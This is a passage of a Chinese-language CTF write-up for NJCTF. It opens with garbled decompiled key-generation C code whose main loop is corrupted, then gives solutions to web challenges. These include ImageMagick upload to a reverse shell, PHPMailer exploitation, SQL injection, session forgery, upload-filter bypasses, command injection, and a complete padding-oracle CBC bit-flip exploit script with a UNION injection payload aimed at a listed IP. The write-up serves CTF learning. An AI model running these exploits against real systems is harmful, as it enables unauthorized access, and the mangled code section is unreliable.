    {
      char *v2; // r6@1
      int v3; // ST0C_4@1
      int v4; // r4@1
      int v5; // r0@1
      int v6; // ST08_4@1
      int v7; // r5@1
      int v8; // r0@1
      int v9; // r0@1
      char v10; // ST10_1@1
      int v11; // r0@1
      int v12; // r5@1
      int v13; // r0@1
      int v14; // ST18_4@1
      int v15; // r0@1
      int v16; // r0@1
      char v17; // r0@1
      char v18; // ST04_1@1
      int v19; // r0@1
      char v20; // r0@1
      int v21; // r1@1
      int v22; // r5@1
      int v23; // r0@1
      char v24; // r0@1
      v2 = out;
      v3 = a1;
      v4 = a1;
      v5 = j_j___modsi3(a1, 10);
      v6 = v5;
      v7 = 20 * v5;
      *v2 = 20 * v5;
      v8 = j_j___divsi3(v4, 100);
      v9 = j_j___modsi3(v8, 10);
      v10 = v9;
      v11 = 19 * v9 + v7;
      v2[1] = v11;
      v2[2] = v11 - 4;
      v12 = v4;
      v13 = j_j___divsi3(v4, 10);
      v14 = j_j___modsi3(v13, 10);
      v15 = j_j___divsi3(v4, 1000000);
      v2[3] = j_j___modsi3(v15, 10) + 11 * v14;
      v16 = j_j___divsi3(v4, 1000);
      v17 = j_j___modsi3(v16, 10);
      //LOBYTE(v4) = v17;
      v4 = v17;
      v18 = v17;
      v19 = j_j___divsi3(v12, 10000);
      v20 = j_j___modsi3(v19, 10);
      v2[4] = 20 * v4 + 60 - v20 - 60;
      v21 = -v6 - v14;
      v22 = -v21;
      v2[5] = -(char)v21 * v4;
      v2[6] = v14 * v4 * v20;
      v23 = j_j___divsi3(v3, 100000);
      v24 = j_j___modsi3(v23, 10);
      v2[7] = 20 * v24 - v10;
      v2[8] = 10 * v18 | 1;
      v2[9] = v22 * v24 - 1;
      v2[10] = v6 * v14 * v10 * v10 - 4;
      v2[11] = (v10 + v14) * v24 - 5;
      v2[12] = 0;
      return v2;
    }
    // 
    /*
    PvrUa7iv3Al1
    PvrUb7Fv3Al1
    PvrVb7Fv3Al1
    PvrVa7iv3Al1
    PvrMb7Fv3Al1
    PvrMa7iv3Al1
    PvrNb7Fv3Al1
    PvrNa7iv3Al1
    PvrOb7Fv3Al1
    PvrOa7iv3Al1
    PvrPb7Fv3Al1
    PvrPa7iv3Al1
    PvrQb7Fv3Al1
    PvrQa7iv3Al1
    PvrRb7Fv3Al1
    PvrRa7iv3Al1
    PvrSb7Fv3Al1
    PvrSa7iv3Al1
    PvrTb7Fv3Al1
    PvrTa7iv3Al1
    PvrUb7Fv3Al1
    PvrUa7iv3Al1
    PvrVb7Fv3Al1
    PvrVa7iv3Al1
    PvrMb7Fv3Al1
    PvrMa7iv3Al1
    PvrNb7Fv3Al1
    PvrNa7iv3Al1
    PvrOb7Fv3Al1
    PvrOa7iv3Al1
    PvrPb7Fv3Al1
    PvrPa7iv3Al1
    PvrQb7Fv3Al1
    PvrQa7iv3Al1
    PvrRb7Fv3Al1
    PvrRa7iv3Al1
    PvrSb7Fv3Al1
    PvrSa7iv3Al1
    PvrTb7Fv3Al1
    PvrTa7iv3Al1
    PvrUb7Fv3Al1
    PvrUa7iv3Al1
    PvrVb7Fv3Al1
    */
    int main()
    {
      char out[256],flag = 0;
      for(unsigned int i=0;i=10)
        {
          for(int j=0;j='a'&&out[j]='A'&&out[j]='0'&&out[j]ImageMagick->PHPMailer
逻辑漏洞：
先add1，然后在refund后将point改为1e5，就有了积分：
然后再去购买服务即可：
**ImageMagick：**
上传png图片发现会被转成bmp，猜测是imagemagick漏洞，于是直接开个reverse shell：
**PHPMailer**
但是比较尴尬的是没找到flag，于是探测内网，发现19存活主机，curl请求下：
猜测是PHPMailer漏洞，根目录不可写，存在uploads目录，但是一句话写进去无法执行，猜测做了权限设置，但是phpmailer在处理时应该是一个比较高的权限，于是写了多个文件去读，最后拿到flag：
**Come On**
宽字节的like盲注，写个脚本跑就好了：
**Chall I**
拿到题目，没有什么特别的思路，试了试nodejs反序列化命令执行也不行，在google上找了找，找到了这个
，几乎跟题目是一样的思路，但是问题在于原来的题目没有对password进行md5，新的题目进行了md5。
又根据
于是想到寻找一个md5之后全部为数字的password，提交之后就会产生内存泄露。
脚本如下：
    import hashlib
    b='-=[],./;"abcdefghijklmnoprstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    a=""
    def find(str1):
        print str1
        flag=0
        for i in hashlib.md5(str1).hexdigest():
            if i>'9':
                flag=1;
                break
        if flag==0:
            print "====================================================="
            print str1
            print hashlib.md5(str1).hexdigest()
            input("success")
        if(len(str1)>3):
            return
        else:
            for i in b:
                find(str1+i)
    if __name__ == '__main__':
        find(a)
找到一个c;Iy，多次提交之后拿到flag：NJCTF{P1e45e_s3arch_th1s_s0urce_cod3_0lddriver}。
**Chall II**
之后就是从
下载源码，把secret_key改成NJCTF{P1e45e_s3arch_th1s_s0urce_cod3_0lddriver}之后登陆，得到session和session.sig分别为session=eyJhZG1pbiI6InllcyJ9;
session.sig=DLXp3JcD1oX3c8v4pUgOAn-pDYo;成功登陆成admin，之后解base64中文得到flag
**Guess：**
题目很简单，首先是一个lfi问价包含拿到upload的源码和index的源码，根据index发现不能跨目录，而且upload过滤很严格。漏洞在于
当phpsession设置为空，这样session_id()就为空了，于是可以cmd5解开$hash求知$ss，然后利用php_mt_seed这个工具爆破出来种子，就可以推测出文件名。
预测文件名的脚本如下：
然后于是利用zip伪协议getshell拿到flag：
**blog：**
题目源码下载下来之后，看到这个注册的时候参数解析有一个admin
同时发现
      | 
这个应该是在delete用户的地方触发的。又因为注册时候是user[password],user[email]这样的格式，于是构造user[admin]=1成功登陆，并拿到flag
**Get Flag**
&号后可以拼接命令，导致列目录
同时代码本身存在LFI，于是读到flag：
**picture wall**
题目开始没有get到点，后来fuzz的时候发现修改host为127.0.0.1的时候可以上传图片，发现后缀名应该是黑名单的过滤，因为我上传一个ppp之类的都行，于是开始测试，发现php,php3,php4,php5都被过滤了，但是phtml没有过滤，但是直接写shell提示是php文件，于是想到去年RCTF2015的那个题目，用直接拿到shell，然后向上两层在html的同级目录找到flag
忘记截图了…
Login
注册admin+n多空格+a字符的用户即可成功，其实就是注册时拼接到数据库时有长度限制，导致
**be admin**
首先发现是存在备份文件index.php.bak。打开之后发现题目很熟悉，根据这个找到应该是今年sessionctf2016那个biscuiti的改编。首先根据流程，首先是使用username=
' union select 'albert','1' %23&password=伪造登录，登录之后就是实现padding oracle
attack了，原理如下图
所以就可以在login哪里触发padding oracle,然后CBC翻转伪造为admin
脚本如下
    import requests
    import base64
    import time
    url='http://218.2.197.235:23737/'
    N=16
    phpsession=""
    ID=""
    def inject1(password):
        param={'username':"' union select 'albert','{password}".format(password=password),'password':''}
        result=requests.post(url,data=param)
        return result
    def inject_token(token):
        header={"Cookie":"PHPSESSID="+phpsession+";token="+token+";ID="+ID}
        result=requests.post(url,headers=header)
        return result
    def xor(a, b):
        return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
    def pad(string,N):
        l=len(string)
        if l!=N:
            return string+chr(N-l)*(N-l)
    def padding_oracle(N,cipher):
        get=""
        for i in xrange(1,N+1):
            for j in xrange(0,256):
                padding=xor(get,chr(i)*(i-1))
                c=chr(0)*(16-i)+chr(j)+padding+cipher
                print c.encode('hex')
                result=inject1(base64.b64encode(chr(0)*16+c))
                if "ctfer" not in result.content:
                    get=chr(j^i)+get
                    # time.sleep(0.1)
                    break
        return get
    session=inject1("aaaaa").headers['set-cookie'].split(',')
    phpsession=session[0].split(";")[0][10:]
    print phpsession
    ID=session[1][4:].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')
    token=session[2][6:].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')
    middle=""
    middle=padding_oracle(N,ID)
    print "ID:"+ID.encode('base64')
    print "token:"+token.encode('base64')
    print "middle:"+middle.encode('base64')
    print "phpsession:"+phpsession
    print "n"
    if(len(middle)==16):
        plaintext=xor(middle,token);
        print plaintext.encode('base64')
        des=pad('admin',N)
        tmp=""
        print des.encode("base64")
        for i in xrange(16):
            tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))
        print tmp.encode('base64')
        result=inject_token(base64.b64encode(tmp))
        print result.content
        if "flag" in result.content or "NJCTF" in result.content or 'njctf' in result.content:
            input("success")